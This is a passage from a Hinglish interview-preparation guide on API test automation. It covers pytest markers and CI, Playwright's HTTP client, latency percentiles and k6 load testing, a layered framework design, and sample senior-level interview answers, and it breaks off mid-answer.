    --strict-markers
    --tb=short
    -ra
    --durations=10
    --color=yes

markers =
    smoke: fast critical-path checks, run on every commit
    security: auth, injection, information disclosure
    slow: takes >10s — rate limits, retries, load
    concurrency: parallel request tests, do not run with -n
    contract: pact verification
    destructive: modifies or deletes data — never against prod

log_cli = true
log_cli_level = INFO
log_cli_format = %(asctime)s %(levelname)-5s %(name)s | %(message)s
log_cli_date_format = %H:%M:%S
```

```bash
# Usage
pytest -m smoke                      # 30 second feedback loop
pytest -m "security and not slow"    # security suite
pytest -m "not slow" -n 8            # parallel, fast tests
pytest -m concurrency -p no:randomly # concurrency tests serially
```

### CI

```yaml
# .github/workflows/api-pytest.yml
name: API Tests (pytest)

on: [push, pull_request]

jobs:
  smoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.12", cache: pip }
      - run: pip install -r requirements.txt
      - name: Smoke tests
        env:
          TEST_ENV: staging
          SM_EMAIL: ${{ secrets.SM_EMAIL }}
          SM_PASSWORD: ${{ secrets.SM_PASSWORD }}
        run: pytest -m smoke --junitxml=reports/smoke.xml

  full:
    needs: smoke
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        suite: [functional, security, contract]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.12", cache: pip }
      - run: pip install -r requirements.txt
      - name: Run ${{ matrix.suite }}
        env:
          TEST_ENV: staging
          ADMIN_EMAIL: ${{ secrets.ADMIN_EMAIL }}
          ADMIN_PASSWORD: ${{ secrets.ADMIN_PASSWORD }}
          SM_EMAIL: ${{ secrets.SM_EMAIL }}
          SM_PASSWORD: ${{ secrets.SM_PASSWORD }}
          OTHER_ORG_EMAIL: ${{ secrets.OTHER_ORG_EMAIL }}
          OTHER_ORG_PASSWORD: ${{ secrets.OTHER_ORG_PASSWORD }}
        run: pytest tests/${{ matrix.suite }} -n 4 --junitxml=reports/${{ matrix.suite }}.xml
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: results-${{ matrix.suite }}
          path: reports/
```

## 10.3 Playwright APIRequestContext

### Kya hai

Playwright ka built-in HTTP client. `requests` jaisa hi, lekin **browser context ke saath
integrated**.

```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    request_context = p.request.new_context(
        base_url="https://staging.merlinai.co",
        extra_http_headers={"Authorization": f"Bearer {token}"},
        timeout=30000,      # milliseconds
    )
    r = request_context.get("/api/v1/sales/s_1024")
    assert r.status == 200
    body = r.json()
```

### Kab `requests` ke bajay ye use karo

**Reason 1 (sabse important): browser ki auth state share karni ho**

```python
def test_api_with_browser_auth_state(page):
    """[SABSE STRONG USE CASE]
    Merlin ka JWT ek COOKIE se aata hai. UI login karne ke baad
    wo cookie browser context mein hai.

    Agar main `requests` use karoon, mujhe wo cookie manually
    extract karke copy karni padegi — aur wo drift kar sakti hai.

    page.request use karne se cookie AUTOMATICALLY share hoti hai."""
    page.goto("/login")
    page.fill("[name=email]", os.environ["SM_EMAIL"])
    page.fill("[name=password]", os.environ["SM_PASSWORD"])
    page.click("button[type=submit]")
    page.wait_for_url("**/dashboard")

    # Ab API call — browser ki cookies automatically jaati hain
    r = page.request.get("/api/v1/projects/p_1/sales")
    assert r.status == 200
    assert r.json()["total"] > 0
```

**Reason 2: hybrid tests — API se setup, UI se verify**

```python
def test_carve_appears_in_ui(page, api_admin):
    """API se data setup karo (fast, reliable), UI se verify karo (real user view).
    Ye pattern UI test suite ko 5-10x fast bana deta hai —
    kyunki setup ke liye 20 UI clicks nahi karne padte."""
    # SETUP via API — 200ms
    budget = api_admin.post("/api/v1/budgets", json={...}).json()
    api_admin.post(f"/api/v1/budgets/{budget['id']}/carve",
                   json={"scopeId": "sc_civil", "amount": 250000, "currency": "INR"})

    # VERIFY via UI — sirf wo cheez jo UI-specific hai
    page.goto(f"/budgets/{budget['id']}")
    expect(page.get_by_test_id("coverage-percent")).to_have_text("2.5%")
    expect(page.get_by_role("row", name="Civil")).to_contain_text("2,50,000")
```

**Reason 3: UI action ka API side-effect verify karna**

```python
def test_ui_close_button_triggers_correct_api_call(page):
    """UI click karo, network request intercept karke verify karo
    ki sahi API call ja rahi hai sahi payload ke saath."""
    page.goto("/sales/s_1024")

    with page.expect_request("**/api/v1/sales/*/close") as req_info:
        page.get_by_role("button", name="Close Sale").click()

    request = req_info.value
    assert request.method == "POST"
    assert request.post_data_json["reason"] == "COMPLETED"

    response = request.response()
    assert response.status == 200
```

**Reason 4: network mocking — error cases jo reproduce nahi ho sakte**

```python
def test_ui_handles_api_500_gracefully(page):
    """Backend ko 500 dene ke liye force nahi kar sakte,
    lekin route interception se simulate kar sakte hain.
    Ye UI ke error handling ko test karta hai —
    kuch jo pure API testing kabhi nahi kar sakti."""
    page.route("**/api/v1/projects/*/sales", lambda route: route.fulfill(
        status=500,
        content_type="application/json",
        body='{"code":"INTERNAL_ERROR","message":"Something went wrong"}',
    ))

    page.goto("/projects/p_1")
    expect(page.get_by_role("alert")).to_contain_text("Unable to load sales")
    expect(page.get_by_role("button", name="Retry")).to_be_visible()


def test_ui_handles_slow_api(page):
    """Loading state test — 3 second delay inject karke."""
    def slow(route):
        time.sleep(3)
        route.continue_()
    page.route("**/api/v1/projects/*/sales", slow)

    page.goto("/projects/p_1")
    expect(page.get_by_test_id("sales-skeleton")).to_be_visible()
```

### Comparison

| | `requests` | Playwright `APIRequestContext` |
|---|---|---|
| Browser auth sharing | Manual cookie extraction | **Automatic** |
| Standalone API suite | **Best** — light, no browser | Overkill (playwright dependency) |
| Concurrency (ThreadPoolExecutor) | **Native** | Awkward (async model) |
| Retry config | urllib3 Retry, fine-grained | Basic |
| Network interception | No | **Yes** — route/fulfill |
| Ecosystem (jsonschema, pact) | **Full Python ecosystem** | Same, but heavier |
| CI speed | Fast | Slower (browser install) |
| Hybrid UI+API tests | Two clients to keep in sync | **One context** |

> **Interview answer (tooling choice):**
>
> "I'd default to pytest with requests for the standalone API suite. It's light, it has the
> full Python ecosystem — jsonschema, Pact, concurrent.futures — and concurrency tests are
> native, which matters because a `ThreadPoolExecutor` firing twenty-five simultaneous carves
> is one of the more valuable tests I write.
>
> I'd reach for Playwright's `APIRequestContext` in three situations. First and most
> importantly, when I need to share browser authentication state. Our JWT arrives in a cookie,
> so after a UI login that credential lives in the browser context — using `page.request`
> means the cookie flows automatically instead of me extracting and copying it, which is the
> kind of thing that silently drifts. Second, for hybrid tests: seed the data through the API
> in a couple of hundred milliseconds and verify the rendering through the UI, which typically
> makes a UI suite several times faster because you're not clicking through twenty steps of
> setup. Third, for things `requests` simply can't do — intercepting the network to assert
> that a UI action fires the right call with the right payload, or using route fulfilment to
> simulate a 500 or a three-second delay so I can test the frontend's error and loading
> states. You can't ask the backend to fail on demand, but you can intercept."

> **Cross-question: "In your ApiClient, why did you restrict retries to idempotent methods?"**
>
> "Because a retry on a non-idempotent request creates duplicate data. Picture a POST to create
> a budget carve: the server processes it and commits, and then the connection drops while the
> response is being written. The client sees a failure, the retry layer fires the same request,
> and now there are two carves for the same scope — in a construction ERP that means the
> accounting is wrong, and nothing in the test output would tell me my own framework caused
> it. So `allowed_methods` covers GET, HEAD, OPTIONS, PUT and DELETE, which are all idempotent
> by specification, and POST and PATCH are excluded. Where I do need a safe retry on a POST,
> it's an explicit opt-in method that attaches an `Idempotency-Key`, so the server can
> deduplicate. I also set `respect_retry_after_header` so a 429 backs off by the interval the
> server asked for rather than a value I guessed."

---

# PART 11 — Performance Basics for APIs

## 11.1 Average kyun jhooth bolta hai

Ye sabse important performance concept hai QA ke liye, aur interview mein aata hai.

```
100 requests ke response times:

  95 requests: 100ms each
   5 requests: 5000ms each

  Average = (95*100 + 5*5000) / 100 = (9500 + 25000) / 100 = 345ms

  "Average 345ms hai — dashboard green hai, SLA 500ms hai, sab theek."

  Reality: 5% users ko 5 SECOND lagta hai.
           Agar aapke 100,000 daily users hain,
           5,000 users har din ek broken experience jhel rahe hain.
```

**Average outliers ko chhupa deta hai. Percentiles unhe expose karte hain.**

```
p50 (median) = 100ms    -> aadhe users se better
p95          = 5000ms   -> 95% users se better; 5% ko isse bura mila
p99          = 5000ms   -> 1% ko isse bhi bura
```

## 11.2 Percentiles — definitions aur kaunsa kab

| Metric | Definition | Kab dekhein |
|---|---|---|
| **p50 / median** | Aadhe requests isse fast | "Typical" experience |
| **p90** | 90% isse fast | Normal degradation |
| **p95** | 95% isse fast | **SLA ke liye standard** |
| **p99** | 99% isse fast | Tail latency — jahan real problems hain |
| **p99.9** | 99.9% isse fast | High-scale systems, GC pauses |
| **max** | Sabse slow | Noisy, lekin timeout debugging mein kaam ka |
| **Average** | Sum / count | **SLA ke liye kabhi mat use karo** |

**Percentile kyun important hai — ek user perspective:**

Ek page load pe agar 20 API calls hoti hain, aur har call ka p99 hai 2 seconds, to
**probability ki user ko kam se kam ek slow call mile = 1 - 0.99^20 = 18%**.

Matlab "sirf 1% requests slow hain" ka user-level matlab hai "18% page loads slow hain".
Ye "tail latency amplification" hai, aur ye batana interview mein strong hai.

## 11.3 Metrics jo matter karte hain

| Metric | Kya | Kaise naapein |
|---|---|---|
| **Latency (response time)** | Ek request kitna time leti hai | p50/p95/p99 |
| **Throughput** | Kitni requests per second handle hoti hain | RPS at a given latency |
| **Error rate** | Kitne % fail hote hain | 5xx / total |
| **Concurrency** | Kitni requests ek saath in-flight | VUs (virtual users) |
| **Saturation** | Resource kitna bhara hai | CPU, memory, DB connections, thread pool |

**Little's Law — ye rishta yaad rakho:**

```
Concurrency = Throughput × Latency

Example: agar 100 RPS chahiye aur latency 200ms hai,
         to concurrency = 100 × 0.2 = 20 concurrent requests

Iska practical matlab: agar latency 200ms se 400ms ho jaye
aur concurrency limit 20 hai, to throughput 100 RPS se 50 RPS gir jayega.
Latency doubling ne throughput half kar diya.
```

## 11.4 Load test ke types

| Type | Kya karta hai | Kya dhoondhta hai |
|---|---|---|
| **Smoke** | 1-5 users, chhota | Script sahi hai kya |
| **Load** | Expected peak traffic | Normal load pe SLA meet hoti hai? |
| **Stress** | Load badhate jao jab tak toote | Breaking point kahan hai |
| **Spike** | Achanak 10x traffic | Auto-scaling reacts? Graceful degradation? |
| **Soak / Endurance** | Normal load, 4-24 ghante | **Memory leaks, connection leaks, disk fill** |
| **Breakpoint** | Slowly ramp to failure | Capacity planning |

**Soak test sabse under-rated hai** — memory leak 10 minute mein nahi dikhta, 6 ghante mein
dikhta hai.

## 11.5 Simple percentile measurement — pytest se

```python
# tests/performance/test_latency_profile.py
import statistics
import concurrent.futures
import pytest


def percentile(sorted_values, p):
    """Nearest-rank percentile. Note: alag tools alag interpolation
    use karte hain, isliye chhote differences normal hain."""
    if not sorted_values:
        return 0.0
    k = max(0, min(len(sorted_values) - 1, int(round(p / 100 * len(sorted_values) + 0.5)) - 1))
    return sorted_values[k]


def latency_profile(fn, n=200, concurrency=1, warmup=5):
    """Latency samples collect karo aur percentiles nikalo."""
    for _ in range(warmup):
        fn()                                   # connections warm karo, JIT/cache warm karo

    samples, errors = [], 0

    def one():
        t0 = time.perf_counter()
        try:
            r = fn()
            ok = r.status_code < 500
        except Exception:
            ok = False
        return time.perf_counter() - t0, ok

    if concurrency == 1:
        results = [one() for _ in range(n)]
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
            results = list(ex.map(lambda _: one(), range(n)))

    for elapsed, ok in results:
        samples.append(elapsed)
        if not ok:
            errors += 1

    samples.sort()
    return {
        "n": n,
        "concurrency": concurrency,
        "errors": errors,
        "error_rate": errors / n,
        "min":  samples[0] * 1000,
        "p50":  percentile(samples, 50) * 1000,
        "p90":  percentile(samples, 90) * 1000,
        "p95":  percentile(samples, 95) * 1000,
        "p99":  percentile(samples, 99) * 1000,
        "max":  samples[-1] * 1000,
        "mean": statistics.mean(samples) * 1000,
    }


@pytest.mark.slow
def test_sales_list_latency_profile(api, project_id):
    """Percentiles report karo, aur p95 pe assert karo — average pe nahi."""
    profile = latency_profile(
        lambda: api.get(f"/api/v1/projects/{project_id}/sales", raise_on_status=False),
        n=200, concurrency=1)

    print(f"\n{'='*60}")
    print(f"GET /projects/{{id}}/sales  (n={profile['n']}, concurrency={profile['concurrency']})")
    print(f"{'='*60}")
    for k in ("min", "p50", "p90", "p95", "p99", "max", "mean"):
        print(f"  {k:>5}: {profile[k]:8.1f} ms")
    print(f"  errors: {profile['errors']} ({profile['error_rate']*100:.1f}%)")
    print(f"{'='*60}")

    assert profile["error_rate"] == 0, f"{profile['errors']} errors"
    assert profile["p95"] < 800, f"p95 {profile['p95']:.0f}ms > 800ms SLA"
    assert profile["p99"] < 2000, f"p99 {profile['p99']:.0f}ms > 2000ms"

    # Tail ratio — p99/p50 bahut bada hona ek red flag hai
    tail_ratio = profile["p99"] / profile["p50"]
    assert tail_ratio < 10, (
        f"p99/p50 = {tail_ratio:.1f}x — bahut variable. "
        "Ye GC pauses, connection pool contention, ya cold cache ka signal hai"
    )


@pytest.mark.slow
@pytest.mark.parametrize("concurrency", [1, 5, 10, 25, 50])
def test_latency_under_increasing_concurrency(api, project_id, concurrency):
    """Concurrency badhne pe latency kaise badhti hai — ye saturation point dikhata hai.
    Ideal: latency flat rehti hai jab tak saturation na aaye, phir sharply badhti hai."""
    profile = latency_profile(
        lambda: api.get(f"/api/v1/projects/{project_id}/sales", raise_on_status=False),
        n=concurrency * 10, concurrency=concurrency)

    throughput = concurrency / (profile["p50"] / 1000)
    print(f"\nconcurrency={concurrency:3d}  p50={profile['p50']:7.1f}ms  "
          f"p95={profile['p95']:7.1f}ms  ~throughput={throughput:6.1f} rps  "
          f"errors={profile['errors']}")

    assert profile["error_rate"] < 0.01, (
        f"concurrency={concurrency} pe {profile['error_rate']*100:.1f}% errors — "
        "connection pool exhaustion ya thread starvation"
    )
```

## 11.6 k6 — proper load testing

pytest performance regression ke liye theek hai. Real load testing ke liye dedicated tool
chahiye.

```javascript
// load/carve-load.js
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Trend } from 'k6/metrics';

const errorRate = new Rate('business_errors');
const carveLatency = new Trend('carve_latency');

export const options = {
  scenarios: {
    // Ramp up to steady load
    steady_load: {
      executor: 'ramping-vus',
      startVUs: 0,
      stages: [
        { duration: '2m', target: 50 },    // ramp up
        { duration: '5m', target: 50 },    // steady
        { duration: '2m', target: 0 },     // ramp down
      ],
    },
    // Spike test — alag scenario, baad mein
    spike: {
      executor: 'ramping-vus',
      startTime: '10m',
      startVUs: 0,
      stages: [
        { duration: '10s', target: 500 },  // sudden 10x
        { duration: '1m',  target: 500 },
        { duration: '10s', target: 0 },
      ],
    },
  },

  // THRESHOLDS — ye test ko pass/fail banate hain
  thresholds: {
    'http_req_duration':          ['p(95)<800', 'p(99)<2000'],
    'http_req_failed':            ['rate<0.01'],       // <1% errors
    'business_errors':            ['rate<0.01'],
    'carve_latency':              ['p(95)<1000'],
    // Per-endpoint thresholds
    'http_req_duration{endpoint:coverage}': ['p(95)<500'],
  },
};

const BASE = __ENV.BASE_URL;
const TOKEN = __ENV.ACCESS_TOKEN;

export default function () {
  const headers = {
    'Authorization': `Bearer ${TOKEN}`,
    'Content-Type': 'application/json',
    'X-Request-Id': `k6-${__VU}-${__ITER}`,
  };

  // Read-heavy operation
  const listRes = http.get(`${BASE}/api/v1/projects/${__ENV.PROJECT_ID}/sales`,
                           { headers, tags: { endpoint: 'sales_list' } });
  check(listRes, {
    'list: status 200':      (r) => r.status === 200,
    'list: has items':       (r) => r.json('items') !== undefined,
    'list: no null totals':  (r) => r.json('items').every(i => i.totalPrice !== null),
  }) || errorRate.add(1);

  sleep(1);

  const covRes = http.get(`${BASE}/api/v1/budgets/${__ENV.BUDGET_ID}/coverage`,
                          { headers, tags: { endpoint: 'coverage' } });
  check(covRes, {
    'coverage: status 200': (r) => r.status === 200,
    'coverage: arithmetic holds': (r) => {
      const b = r.json();
      return b.carvedAmount + b.remainingAmount === b.totalBudget;
    },
  }) || errorRate.add(1);

  carveLatency.add(covRes.timings.duration);
  sleep(Math.random() * 2);       // think time — realistic user behaviour
}
```

```bash
k6 run --env BASE_URL=https://staging.merlinai.co \
       --env ACCESS_TOKEN=$TOKEN \
       --env PROJECT_ID=p_1 \
       --env BUDGET_ID=b_1 \
       --out json=results.json \
       load/carve-load.js
```

**Load test mein bhi correctness assertions daalo** — ye important point hai. Sirf latency
nahi, `carvedAmount + remainingAmount === totalBudget` bhi check karo. Kyunki **load ke
neeche correctness bugs surface hote hain** jo single-request tests mein nahi dikhte.

## 11.7 Interview answers

> **Interview answer (percentiles):**
>
> "I don't use averages for latency, because an average hides exactly the users you care
> about. If ninety-five requests take a hundred milliseconds and five take five seconds, the
> average is three hundred and forty-five milliseconds, which looks comfortably inside a
> five-hundred-millisecond SLA — while one in twenty users is waiting five seconds. The
> average is arithmetically correct and operationally useless.
>
> So I report p50, p95 and p99. p50 tells me the typical experience, p95 is what I'd hold an
> SLA against, and p99 is where the real problems live — that's the tail, and the tail is
> usually garbage collection pauses, connection pool contention, cold caches, or a slow query
> that only fires on certain data.
>
> There's a second reason the tail matters more than it looks. If a page makes twenty API
> calls and each has a one percent chance of being slow, the probability that the user hits at
> least one slow call is about eighteen percent. So 'only one percent of requests are slow'
> translates to nearly one in five page loads being slow. That's tail latency amplification,
> and it's why I'd argue for a p99 target and not just a p95 one.
>
> I also watch the ratio of p99 to p50. If p50 is a hundred milliseconds and p99 is two
> seconds, that twenty-times spread tells me the system is highly variable, which is a
> different problem from being uniformly slow — and it needs a different investigation."

> **Cross-question: "How do you make sure your load test numbers are trustworthy?"**
>
> "Four things I check before I believe a number. First, protocol parity — if production runs
> HTTP/2 and my generator speaks HTTP/1.1, I'm measuring a connection bottleneck that doesn't
> exist in production. Second, the load generator itself: if the client machine is saturated on
> CPU or file descriptors, I'm measuring my own laptop, so I watch generator-side resource
> usage and scale out rather than up. Third, warm-up — the first requests pay DNS, TCP, TLS and
> JIT costs, and caches are cold, so I discard a warm-up phase rather than letting it pollute
> p99. Fourth, and this is the one people skip, correctness assertions inside the load test.
> Latency thresholds alone will happily pass while the API returns garbage under contention —
> so my k6 checks assert that carved plus remaining still equals the total, and that no
> `totalPrice` is null. Load is exactly when race conditions surface, so a load test that only
> measures time is throwing away its best signal."

---

# PART 12 — Senior Scenario Questions

Ye section sabse zyada weight rakhta hai. Har answer English mein hai — **yahi bolna hai**.
Har jagah [REAL] examples plug kiye gaye hain.

---

## Q1. "How would you build a complete API automation framework, bypassing the UI entirely?"

### Architecture — pehle diagram bolo

```
┌─────────────────────────────────────────────────────────────────────┐
│  LAYER 5 — CI/CD                                                    │
│  smoke (every commit) -> functional+security (PR) -> contract (pre-deploy)
│  -> nightly full suite + load                                        │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
┌──────────────────────────▼──────────────────────────────────────────┐
│  LAYER 4 — TESTS                                                    │
│  tests/smoke/  tests/functional/  tests/security/  tests/contract/  │
│  Har test: arrange (factory) -> act (client) -> assert (validators) │
│  Markers: smoke, security, slow, concurrency, destructive           │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
┌──────────────────────────▼──────────────────────────────────────────┐
│  LAYER 3 — TEST DATA                                                │
│  Builders (fluent, in-memory)   Factories (API-backed + cleanup)    │
│  BudgetFactory.create() -> yields budget, deletes on teardown       │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
┌──────────────────────────▼──────────────────────────────────────────┐
│  LAYER 2 — DOMAIN / SERVICE OBJECTS                                 │
│  BudgetService.carve(budget_id, scope, amount) -> Carve             │
│  Endpoint paths, payload shapes, response parsing — YAHAN, tests mein nahi
│  URL badla? EK jagah fix.                                            │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
┌──────────────────────────▼──────────────────────────────────────────┐
│  LAYER 1 — TRANSPORT                                                │
│  ApiClient: session, retry (idempotent only), timeout, logging,     │
│  correlation id, secret redaction, rich failure messages            │
│  AuthProvider: token acquisition + caching per role                 │
│  Config: env-driven, production safety rail                         │
└─────────────────────────────────────────────────────────────────────┘

CROSS-CUTTING:
  schemas/     JSON Schema per resource, additionalProperties: false
  validators/  assert_no_nulls, assert_invariants, assert_no_leaks
  reporting/   JUnit XML + HTML, correlation ids in failure output
```

### Layer 2 ka code — service object

```python
# framework/services/budget_service.py
from dataclasses import dataclass
from framework.client import ApiClient


@dataclass
class Carve:
    id: str
    budget_id: str
    scope_id: str
    amount: int
    currency: str
    status: str
    raw: dict


class BudgetService:
    """Domain layer. Tests kabhi URLs nahi jaante —
    wo BudgetService.carve(...) call karte hain.

    Fayda: agar /api/v1/budgets/{id}/carve ka path badle,
    ya payload shape badle, main EK jagah fix karta hoon —
    200 tests mein nahi."""

    def __init__(self, client: ApiClient):
        self.client = client

    def carve(self, budget_id: str, scope_id: str, amount: int,
              currency: str = "INR", notes: str | None = None,
              idempotency_key: str | None = None,
              expected_status: int | tuple = 201):
        payload = {"scopeId": scope_id, "amount": amount, "currency": currency}
        if notes is not None:
            payload["notes"] = notes
        headers = {"Idempotency-Key": idempotency_key} if idempotency_key else {}

        r = self.client.post(f"/api/v1/budgets/{budget_id}/carve",
                             json=payload, headers=headers,
                             expected_status=expected_status)
        if r.status_code == 201:
            b = r.json()
            return Carve(b["id"], b["budgetId"], b["scopeId"],
                         b["amount"], b["currency"], b["status"], b)
        return r

    def coverage(self, budget_id: str) -> dict:
        return self.client.get(f"/api/v1/budgets/{budget_id}/coverage",
                               expected_status=200).json()

    def convert_to_offer(self, budget_id: str, expected_status=200):
        return self.client.post(f"/api/v1/budgets/{budget_id}/convert-to-offer",
                                expected_status=expected_status)
```

### Layer 3 ka code — factory with guaranteed cleanup

```python
# framework/data/factories.py
import contextlib, uuid


class BudgetFactory:
    """API-backed factory. Har created resource track hota hai
    aur teardown pe delete hota hai — chahe test fail ho ya pass."""

    def __init__(self, admin_client):
        self.client = admin_client
        self._created = []

    def create(self, *, total_amount=10_000_000, scopes=None, **overrides) -> dict:
        payload = {
            "projectId": os.environ["TEST_PROJECT_ID"],
            "name": f"qa-{uuid.uuid4().hex[:8]}",       # unique — no collisions
            "totalAmount": total_amount,
            "currency": "INR",
            "scopes": scopes or [
                {"id": "sc_civil", "name": "Civil", "plannedAmount": total_amount // 2},
                {"id": "sc_elec",  "name": "Elec",  "plannedAmount": total_amount // 4},
            ],
            **overrides,
        }
        b = self.client.post("/api/v1/budgets", json=payload, expected_status=201).json()
        self._created.append(b["id"])
        return b

    def cleanup(self):
        for bid in reversed(self._created):     # reverse — dependencies pehle
            with contextlib.suppress(Exception):
                self.client.delete(f"/api/v1/budgets/{bid}")
        self._created.clear()


@pytest.fixture
def budgets(api_admin):
    factory = BudgetFactory(api_admin)
    yield factory
    factory.cleanup()      # ALWAYS runs — even on test failure
```

### Layer 4 — ab test kitna saaf dikhta hai

```python
def test_carve_updates_coverage(budgets, budget_service):
    """Ab test business language mein hai — HTTP kahin nahi dikh raha."""
    budget = budgets.create(total_amount=10_000_000)

    before = budget_service.coverage(budget["id"])
    carve = budget_service.carve(budget["id"], "sc_civil", 250_000)
    after = budget_service.coverage(budget["id"])

    assert carve.status == "ACTIVE"
    assert after["carvedAmount"] == before["carvedAmount"] + 250_000
    assert after["carvedAmount"] + after["remainingAmount"] == after["totalBudget"]
```

### CI pipeline stages

```
Commit         -> smoke (30 sec, 15 tests)          -> fail = block push
PR opened      -> functional + security (5 min)     -> fail = block merge
                  contract verification              -> fail = block merge
Pre-deploy     -> can-i-deploy check                 -> fail = block deploy
Post-deploy    -> smoke against the deployed env     -> fail = auto-rollback
Nightly        -> full suite + slow + load           -> fail = ticket
Every 5 min    -> production read-only monitor       -> fail = PagerDuty
```

> **Interview answer:**
>
> "I'd build it in five layers, and the reason for the layering is that each one changes for a
> different reason.
>
> Layer one is transport — a single `ApiClient` wrapping a requests Session. That gives me
> connection reuse, so I'm not paying a TLS handshake per request, and it's the one place
> where I set timeouts, retries, logging and headers. Two design decisions I'd defend there:
> retries are restricted to idempotent methods only, because a retried POST creates duplicate
> data and nothing in the test output would tell me my own framework caused it; and every
> request carries a generated `X-Request-Id` which appears in the failure message, so a bug
> report hands the developer the exact log line. I also redact Authorization and Cookie headers
> in logs, because CI logs are widely readable.
>
> Layer two is domain services — `BudgetService.carve(budget_id, scope, amount)`. Tests never
> know URLs or payload shapes. When an endpoint path or a field name changes, I fix one file,
> not two hundred tests. That's the layer that decides whether the suite survives a year.
>
> Layer three is test data: builders for in-memory shapes and API-backed factories that track
> everything they create and delete it on teardown, so a failing test doesn't leak data into
> the next run. Every created resource gets a UUID-suffixed name so parallel runs can't
> collide.
>
> Layer four is the tests, grouped by intent — smoke, functional, security, contract — and
> marked so I can slice them. Layer five is CI, and I'd stage it by feedback speed: smoke on
> every commit in thirty seconds, functional and security plus contract verification on pull
> requests, a `can-i-deploy` gate before release, smoke against the deployed environment after,
> and the slow and load suites nightly.
>
> The thing I'd emphasise is that bypassing the UI isn't only about speed. It's about reaching
> failure modes the UI can't produce. The UI will never send a malformed JWT, never fire
> twenty-five simultaneous carves at one scope, never post a body with an extra `orgId` field.
> Those are exactly the tests that found real defects for us."

---

## Q2. "API returns 200 but data is wrong. Is that a bug? How do you catch it?"

> **Interview answer:**
>
> "Yes, and I'd argue it's the more dangerous kind of bug, because nothing alerts on it. A 500
> pages someone; a 200 with wrong data flows quietly into reports, invoices and decisions.
>
> I've hit this exactly. At Merlin a customer-facing endpoint returned a clean 200 with
> `totalPrice: null` and an empty `lineItems` array — for a contract that had a real, signed
> value. Status was fine, content type was fine, and the response was structurally valid JSON.
> The root cause was that the reader only looked at the estimate entity, while the frozen price
> actually lived on the Sale entity. Nothing about the transport was wrong; the wrong source
> was being read.
>
> What that taught me is that the status code is the weakest assertion in an API test. So I
> catch this class with layered assertions. Schema validation gets me types and required
> fields, but I'd be honest about its limit: if `totalPrice` is declared nullable — and most
> fields are — the schema passes that exact bug. So above schema I run four things. A
> null-safety walk over the whole response with an explicit allowlist of genuinely nullable
> paths, so an unexpected null is a failure and a legitimate one is a documented decision.
> Arithmetic invariants — carved plus remaining equals total, the sum of line items equals the
> header total, the percentage matches the ratio — because those hold regardless of what the
> data is, so they're not brittle. Round-trip checks, where I create a resource with known
> values and read it back, which catches silent drops, truncation and encoding damage.
> And cross-endpoint consistency: after a carve, the coverage endpoint must reflect it, because
> that tests the seam between two components rather than one component in isolation.
>
> The other habit I'd name is treating empty as suspicious. An empty array looks like a valid
> empty state, and in that bug it was an empty array. So whenever a collection comes back
> empty, my question is 'should this genuinely be empty for this fixture?' — and if the test
> can't answer that, the test isn't asserting anything."

> **Cross-question: "How do you know what the right value is?"**
>
> "Three sources, in order of preference. Best is data the test created itself — I carve
> 250,000, so I assert 250,000 comes back, and that's stable forever. Second is an invariant
> rather than a literal — the parts sum to the whole, the ratio matches — which holds for any
> data. Third, and only when neither applies, an independent computation of the expected value
> from a different path than the one under test: reading it from the database directly, or
> deriving it from a different endpoint. What I avoid is asserting the value the API returned
> against a constant I copied out of the API's own output, because that just freezes today's
> behaviour, bug included."

---

## Q3. "How do you test an API you have no documentation for?"

> **Interview answer:**
>
> "I'd treat it as reverse engineering with a written artefact at the end, because the
> documentation gap is itself a finding I want to close.
>
> First, discovery. The fastest source is the frontend: I open the application, work through
> the real user journeys with the browser network tab recording, and export a HAR. That gives
> me every endpoint that actually matters, with real payloads, real headers and the real auth
> mechanism — which is far more valuable than a spec, because it's what the system genuinely
> does. Then I check the obvious machine-readable sources: `/swagger-ui`, `/v3/api-docs`,
> `/openapi.json`, and if it's GraphQL, an introspection query, which gives me the entire
> schema in one call. If there's a mobile app I'd proxy it through mitmproxy for the same
> reason. And if I have repository access — which I did at Merlin — reading the controller
> annotations is the ground truth: the routes, the DTOs, the validation annotations and the
> security annotations are the actual contract.
>
> Second, I probe behaviour systematically rather than randomly. `OPTIONS` on each path to
> learn allowed methods, and the `Allow` header on a deliberate 405. I send an empty body to
> learn which fields are required from the validation errors. I send wrong types to learn the
> expected types. I send an unknown field to see whether it's rejected or silently ignored,
> which tells me how strict the API is. I remove the auth header to confirm the endpoint is
> actually protected — and that one occasionally finds an endpoint nobody realised was public.
>
> Third, I capture what I learn as executable documentation rather than a wiki page. I record
> real responses, generate a baseline JSON Schema from them with a tool like genson, then
> tighten it by hand — adding enums, patterns, minimums, and `additionalProperties: false`.
> Now the schema is a test, and it fails when the API drifts. That's documentation that can't
> go stale.
>
> Finally, I write down every assumption I had to make and take that list to the developer or
> product owner. That conversation is usually short and high-yield, because a concrete list of
> twelve questions gets answered where 'can you document this API' does not. And the questions
> themselves surface bugs — at Merlin, asking 'what should happen if two contacts share an
> email address' is exactly the kind of question that exposed a missing uniqueness constraint."

> **Cross-question: "What if you can't reach anyone and there's no frontend?"**
>
> "Then I'm limited to black-box probing, and I'd be explicit about that limitation rather than
> pretending to coverage I don't have. I can still establish the shape of the API, the auth
> mechanism, the validation rules and the error surface, and I can still test the properties
> that are true regardless of business rules: no client input should produce a 500, error
> messages shouldn't leak internals, authorization should be consistent across methods, and
> the same request twice should behave predictably. Those are real findings. What I cannot do
> is verify business correctness, because I'd have no oracle for what the right value is — and
> I'd say that plainly in my test report rather than let it look like the API is verified."

---

## Q4. "How would you test a payment API?"

> **Interview answer:**
>
> "Payments are where the properties I care about elsewhere become non-negotiable, so I'd
> organise it around what specifically makes money different: it's irreversible, it's
> regulated, and a duplicate is worse than a failure.
>
> Idempotency is the first thing I'd test, not the last. Every charge request carries an
> idempotency key, and I test that the same key returns the original result rather than
> charging again; that the same key with a *different* payload is rejected rather than silently
> returning the cached response, because otherwise a client thinks its second payment
> succeeded when nothing happened; and that a client-side timeout followed by a retry with the
